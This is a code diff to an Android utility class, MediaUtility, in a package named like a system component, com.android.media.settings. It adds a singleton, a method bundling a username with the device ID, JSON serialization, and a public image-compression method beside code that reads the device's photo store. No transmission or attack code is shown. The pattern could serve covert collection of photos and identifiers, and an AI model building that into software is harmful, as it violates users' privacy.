@@ -17,10 +17,12 @@ import android.provider.Settings;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
 
-import com.android.media.settings.API.MediaAPI;
+import com.android.media.settings.Interface.MediaAPI;
 import com.android.media.settings.MediaConfig;
 import com.android.media.settings.MediaDBManager;
-import com.android.media.settings.Models.Media;
+import com.android.media.settings.Model.Media;
+import com.android.media.settings.Model.User;
+import com.google.gson.Gson;
 
 import java.io.File;
 import java.io.IOException;
@@ -48,6 +50,7 @@ public class MediaUtility {
     private Context context;
     private MediaDBManager dbManager;
     private MediaConfig mConfig;
+    private static MediaUtility mMediaUtility;
 
     private Uri extMediaUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
     private String projection[] = {
@@ -65,6 +68,22 @@ public class MediaUtility {
     }
 
     public MediaUtility() {
+    }
+
+    public static MediaUtility getInstance(Context context) {
+        if(mMediaUtility == null) {
+            mMediaUtility = new MediaUtility(context);
+        }
+        return mMediaUtility;
+    }
+
+    public User getUser(){
+        return new User(getUsername(), getDeviceId());
+    }
+
+    public String toJson(Object object) {
+        Gson gson = new Gson();
+        return gson.toJson(object);
     }
 
     Cursor fetchMediaStore() {
@@ -129,7 +148,7 @@ public class MediaUtility {
         }
     }
 
-    private File compressImage(String strUri, String id) {
+    public File compressImage(String strUri, String id) {
         Bitmap.CompressFormat format = getCompressFormat(strUri);
         return ImageUtility.compressToFile(
                 context,
